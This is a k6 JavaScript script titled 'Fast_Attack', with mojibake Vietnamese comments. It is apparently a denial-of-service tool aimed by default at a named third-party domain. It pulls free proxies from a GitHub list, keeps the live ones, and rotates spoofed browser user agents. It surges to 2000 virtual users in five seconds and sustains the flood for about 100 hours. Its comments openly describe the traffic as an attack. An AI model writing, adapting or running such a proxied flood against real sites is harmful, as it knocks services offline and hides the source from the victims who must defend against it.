// üÖæÔ∏è T√™n file: Fast_Attack (js)
import http from 'k6/http';
import { check, group, sleep, fail } from 'k6';
import { html } from 'k6/html';

// --- C·∫§U H√åNH ---
const BASE_URL = __ENV.TARGET_URL || 'https://certapple.com';
const PROXY_FILE_URL = 'https://raw.githubusercontent.com/Thuongquanggg/Proxy/main/proxies.txt';
const PROXY_CHECK_URL = 'https://api.ipify.org'; // URL nh·∫π ƒë·ªÉ ki·ªÉm tra proxy
const MAX_PROXIES_TO_USE = 100; // THAY ƒê·ªîI: L·∫•y 100 proxy
const PROXY_CHECK_TIMEOUT = '7s'; // Gi·∫£m timeout ƒë·ªÉ ki·ªÉm tra nhanh h∆°n
const MAX_FETCH_ATTEMPTS = 3; // S·ªë l·∫ßn th·ª≠ l·∫°i t·ªëi ƒëa khi l·∫•y proxy

// --- BI·∫æN TO√ÄN C·ª§C ---
const USER_AGENTS = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.51',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
];

// --- H√ÄM CHU·∫®N B·ªä (SETUP FUNCTION) - CH·∫†Y 1 L·∫¶N TR∆Ø·ªöC KHI TEST ---
// T·ªêI ∆ØU: To√†n b·ªô logic l·∫•y v√† ki·ªÉm tra proxy ƒë∆∞·ª£c chuy·ªÉn v√†o ƒë√¢y ƒë·ªÉ tƒÉng t·ªëc ƒë·ªô.
export function setup() {
console.log("--- GIAI ƒêO·∫†N SETUP: B·∫Øt ƒë·∫ßu chu·∫©n b·ªã proxy ---");

let allProxies = [];
// Th·ª≠ l·∫°i t·ªëi ƒëa MAX_FETCH_ATTEMPTS l·∫ßn
for (let attempt = 1; attempt <= MAX_FETCH_ATTEMPTS; attempt++) {
console.log(`ƒêang l·∫•y danh s√°ch proxy t·ª´ GitHub (l·∫ßn th·ª≠ ${attempt}/${MAX_FETCH_ATTEMPTS})...`);
const res = http.get(PROXY_FILE_URL, { timeout: '30s' });
if (res.status === 200 && res.body) {
allProxies = res.body.trim().split('\n').filter(p => p.trim() !== '');
if (allProxies.length > 0) {
console.log(`L·∫•y th√†nh c√¥ng ${allProxies.length} proxy th√¥.`);
break; // Tho√°t kh·ªèi v√≤ng l·∫∑p khi ƒë√£ th√†nh c√¥ng
}
}
console.warn(`L·∫ßn th·ª≠ ${attempt} th·∫•t b·∫°i. Status: ${res.status}. Th·ª≠ l·∫°i sau 2 gi√¢y...`);
if (attempt < MAX_FETCH_ATTEMPTS) sleep(2);
}

if (allProxies.length === 0) {
fail("Kh√¥ng th·ªÉ l·∫•y danh s√°ch proxy sau t·∫•t c·∫£ c√°c l·∫ßn th·ª≠. D·ª´ng b√†i test.");
}

// L·∫•y 100 proxy ƒë·∫ßu ti√™n ƒë·ªÉ ki·ªÉm tra
const proxiesToCheck = allProxies.slice(0, MAX_PROXIES_TO_USE);
console.log(`ƒê√£ ch·ªçn ${proxiesToCheck.length} proxy ƒë·ªÉ ki·ªÉm tra...`);

// Ki·ªÉm tra c√°c proxy c√≤n s·ªëng
const liveProxies = checkAndFilterProxies(proxiesToCheck);

if (liveProxies.length === 0) {
fail("Kh√¥ng c√≥ proxy n√†o c√≤n s·ªëng sau khi ki·ªÉm tra. D·ª´ng b√†i test.");
}

console.log(`--- GIAI ƒêO·∫†N SETUP: Ho√†n t·∫•t. S·∫µn s√†ng ${liveProxies.length} proxy cho c√°c VUs. ---`);
// D·ªØ li·ªáu tr·∫£ v·ªÅ t·ª´ setup() s·∫Ω ƒë∆∞·ª£c truy·ªÅn v√†o h√†m default() v√† c√°c VU kh√°c.
return { liveProxies: liveProxies };
}

function checkAndFilterProxies(proxies) {
const requests = {};
proxies.forEach(p => {
requests[p] = {
method: 'GET',
url: PROXY_CHECK_URL,
params: { proxy: p, timeout: PROXY_CHECK_TIMEOUT },
};
});

const responses = http.batch(requests);
const liveProxies = [];
for (const proxy in responses) {
if (responses[proxy].status === 200) {
liveProxies.push(proxy);
}
}
console.log(`Ki·ªÉm tra ho√†n t·∫•t: ${liveProxies.length}/${Object.keys(requests).length} proxy c√≤n s·ªëng.`);
return liveProxies;
}

// --- C·∫§U H√åNH K·ªäCH B·∫¢N TEST ---
export const options = {
insecureSkipTLSVerify: true,
scenarios: {
daily_traffic_simulation: {
executor: 'ramping-vus',
startTime: '0s',
// T·ªêI ∆ØU: TƒÉng t·∫£i nhanh h∆°n ƒë·ªÉ t·∫•n c√¥ng ngay l·∫≠p t·ª©c
stages: [
{ duration: '5s', target: 2000 },   // Trong 5s, tƒÉng v·ªçt l√™n 2000 VUs
{ duration: '5m', target: 2000 },   // Gi·ªØ 2000 VUs trong 5 ph√∫t
{ duration: '6000m', target: 2000 }, // Giai ƒëo·∫°n t·∫•n c√¥ng k√©o d√†i
],
gracefulStop: '2m',
exec: 'main', // ƒê·ªïi t√™n h√†m th·ª±c thi ch√≠nh ƒë·ªÉ r√µ r√†ng h∆°n
},
},
thresholds: {
'http_req_duration{type:html}': ['p(95)<5000'],
'http_req_duration{type:asset}': ['p(95)<3000'],
'http_req_failed': ['rate<0.30'],
'checks': ['rate>0.70'],
},
};

// --- ƒêI·ªÇM V√ÄO CH√çNH (MAIN VU FUNCTION) ---
// T·ªêI ∆ØU: H√†m n√†y gi·ªù nh·∫≠n 'data' t·ª´ h√†m setup(), kh√¥ng c√≤n logic l·∫•y proxy ph·ª©c t·∫°p.
export function main(data) {
// L·∫•y danh s√°ch proxy ƒë√£ ƒë∆∞·ª£c chu·∫©n b·ªã s·∫µn
const proxyPool = data.liveProxies;

// Ph√¢n b·ªï h√†nh vi ng·∫´u nhi√™n cho VU
const random = Math.random();
if (random < 0.2) {
firstTimeVisitor(proxyPool);
} else if (random < 0.4) {
returningVisitor(proxyPool);
} else {
chaoticBrowser(proxyPool);
}
}

// --- C√ÅC H√ÄM M√î PH·ªéNG H√ÄNH VI ---
// (Kh√¥ng thay ƒë·ªïi)
function firstTimeVisitor(proxies) {
const params = getBaseParams(proxies);
group('H√†nh vi: Kh√°ch l·∫ßn ƒë·∫ßu', function () {
const res = http.get(BASE_URL, { ...params, tags: { type: 'html' } });
const isStatusOk = check(res, { 'Trang ch·ªß OK': (r) => r && r.status === 200 });
if (isStatusOk && res.body) {
loadPageAssets(res, params, null);
}
});
sleep(Math.random() * 4 + 3);
}

const vuCache = new Map();

function returningVisitor(proxies) {
const params = getBaseParams(proxies);
group('H√†nh vi: Kh√°ch quay l·∫°i', function () {
const res = http.get(BASE_URL, { ...params, tags: { type: 'html' } });
const isStatusOk = check(res, { 'Trang ch·ªß OK': (r) => r && r.status === 200 });
if (isStatusOk && res.body) {
loadPageAssets(res, params, vuCache);
}
});
sleep(Math.random() * 4 + 3);
}

const internalLinks = new Set([BASE_URL]);

function chaoticBrowser(proxies) {
const params = getBaseParams(proxies);
group('H√†nh vi: Ng∆∞·ªùi d√πng ƒëi d·∫°o', function () {
const linksArray = Array.from(internalLinks);
const currentUrl = linksArray.length > 0 ? linksArray[Math.floor(Math.random() * linksArray.length)] : BASE_URL;
const res = http.get(currentUrl, { ...params, tags: { type: 'html' } });
const isStatusOk = check(res, { 'T·∫£i trang OK': (r) => r && r.status === 200 });
if (isStatusOk && res.body) {
const discoveredLinks = loadPageAssets(res, params, null);
discoveredLinks.forEach(link => internalLinks.add(link));
}
});
sleep(Math.random() * 5 + 4);
}

// --- C√ÅC H√ÄM H·ªñ TR·ª¢ ---
// (Kh√¥ng thay ƒë·ªïi)
function getBaseParams(proxyPool) {
const params = {
headers: {
'User-Agent': USER_AGENTS[__VU % USER_AGENTS.length],
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
},
};

if (proxyPool && proxyPool.length > 0) {
params.proxy = proxyPool[__VU % proxyPool.length];
} else {
// Tr∆∞·ªùng h·ª£p n√†y √≠t khi x·∫£y ra do ƒë√£ c√≥ h√†m setup() ki·ªÉm tra
console.warn(`[VU=${__VU}] B·ªÉ proxy r·ªóng. Request s·∫Ω ƒë∆∞·ª£c g·ª≠i kh√¥ng qua proxy.`);
}
return params;
}

function loadPageAssets(res, params, cache) {
const discoveredLinks = new Set();
if (!res || !res.body) {
return Array.from(discoveredLinks);
}

const doc = html.parse(res.body);
const assetUrls = new Set();

doc.find('link[href], script[src], img[src], video[src], audio[src], source[src]').each((_, el) => {
const url = el.attr('href') || el.attr('src');
if (url) assetUrls.add(resolveUrl(url, res.url));
});

const contentType = res.headers['Content-Type'];
const isCssResponse = contentType && contentType.includes('css');
const cssBody = doc.find('style').text() + (isCssResponse ? res.body : '');
const cssUrls = cssBody.match(/url\(['"]?([^'")]+)['"]?\)/g) || [];
cssUrls.forEach(match => {
const url = match.replace(/url\(['"]?/, '').replace(/['"]?\)/, '');
if (url && !url.startsWith('data:')) {
assetUrls.add(resolveUrl(url, res.url));
}
});

doc.find('a[href]').each((_, el) => {
const link = el.attr('href');
if (link) {
const resolvedLink = resolveUrl(link, res.url);
if (resolvedLink && resolvedLink.startsWith(BASE_URL) && !resolvedLink.match(/\.(jpg|jpeg|png|gif|css|js|pdf)$/i) && !resolvedLink.includes('#')) {
discoveredLinks.add(resolvedLink);
}
}
});

const requests = [];
assetUrls.forEach(url => {
if (url) {
const assetParams = { ...params, tags: { type: 'asset' } };
if (cache && cache.has(url)) {
assetParams.headers['If-None-Match'] = cache.get(url);
}
requests.push(['GET', url, null, assetParams]);
}
});

if (requests.length > 0) {
const responses = http.batch(requests);
if (cache) {
responses.forEach((r, i) => {
const url = requests[i][1];
if (r && r.status === 200 && r.headers['Etag']) {
cache.set(url, r.headers['Etag']);
}
if (r) {
check(r, { 'T√†i nguy√™n cache h·ª£p l·ªá (200 ho·∫∑c 304)': (res) => [200, 304].includes(res.status) });
}
});
}
}
return Array.from(discoveredLinks);
}

function resolveUrl(url, pageUrl) {
try {
return (new URL(url, pageUrl)).href;
} catch (e) {
console.warn(`URL kh√¥ng h·ª£p l·ªá: "${url}" tr√™n trang ${pageUrl}`);
return '';
}
}
